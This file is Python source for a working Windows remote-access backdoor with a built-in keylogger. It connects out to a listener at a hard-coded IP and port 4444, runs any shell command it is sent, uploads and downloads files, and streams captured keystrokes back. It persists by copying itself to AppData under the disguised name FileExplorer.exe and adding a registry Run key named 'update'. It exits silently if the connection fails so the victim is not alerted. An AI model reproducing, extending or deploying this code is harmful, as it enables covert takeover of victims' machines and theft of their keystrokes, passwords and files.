#!/usr/bin/env python
import os
import socket
import subprocess
import json
import base64
from pynput import keyboard
import sys
import shutil

cmd_result = ""



class Keylogger:
    def __init__(self):
        self.log = ""

    def process_key_press(self, key):
        try:
            self.log = self.log + str(key.char)
        except AttributeError:
            if key == key.space:
                self.log = self.log + " "
            elif key == key.backspace:
                self.log = self.log[:-1]
            else:
                self.log = self.log + "  " + str(key) + "  "  # takes special keys





class Backdoor(Keylogger):
    def __init__(self, ip, port):
        super().__init__()
        self.embed_startup()
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def exe_sys_com(self, command):
        return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)


    def send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def recv(self):
        json_data = b""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def read_file(self, filepath):
        with open(filepath, "rb") as file:
            return base64.b64encode(file.read())

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))  # allows downloading of any type of file
            return f"[UPLOAD SUCCESSFUL]"

    def cwd(self, path):
        os.chdir(path)
        return path

    def report(self):
        recv_cmd = ["0"]
        while recv_cmd != "exit":
            self.send(self.log)  # send report here
            self.log = ""
            recv_cmd = self.recv()
            if recv_cmd == "exit":  # exit when client presses ctrl + c
                self.stop_listener()


    def start(self):
        self.keyboard_listener = keyboard.Listener(on_press=self.process_key_press)

        with self.keyboard_listener:
            self.report()
            self.keyboard_listener.join()  # starts listener


    def stop_listener(self):
        self.keyboard_listener.stop()

    def embed_startup(self):
        embed_dir = os.environ["appdata"] + "\\FileExplorer.exe"
        if not os.path.exists(embed_dir):  # ensure that file is only embedded in registry once
            shutil.copyfile(sys.executable, embed_dir)
            subprocess.call(f"reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d {embed_dir}", shell=True)







    def run(self):
        global cmd_result
        while True:
            recv_cmd = self.recv()
            try:
                if recv_cmd[0] == "exit":
                    self.connection.close()
                    sys.exit()
                elif recv_cmd[0] == "cd" and len(recv_cmd) > 1:
                    cmd_result = self.cwd(recv_cmd[1])
                elif recv_cmd[0] == "download":
                    cmd_result = self.read_file(recv_cmd[1]).decode()
                elif recv_cmd[0] == "upload":
                    cmd_result = self.write_file(recv_cmd[1], recv_cmd[2])  # writes file in current working directory
                elif recv_cmd[0] == "keylogger":
                    self.start()
                    cmd_result = "[EXIT KEYLOGGER]"

                else:
                    cmd_result = self.exe_sys_com(recv_cmd).decode()  # store result of received command in variable
            except Exception:
                cmd_result = "{!} Invalid command"
            self.send(cmd_result)  # send the result of the command back to listener




try:
    my_backdoor = Backdoor("192.168.86.22", 4444)
    my_backdoor.run()
except Exception:  # so it doesn't give error message and alert user if
    sys.exit()     # it is not able to connect to the listener
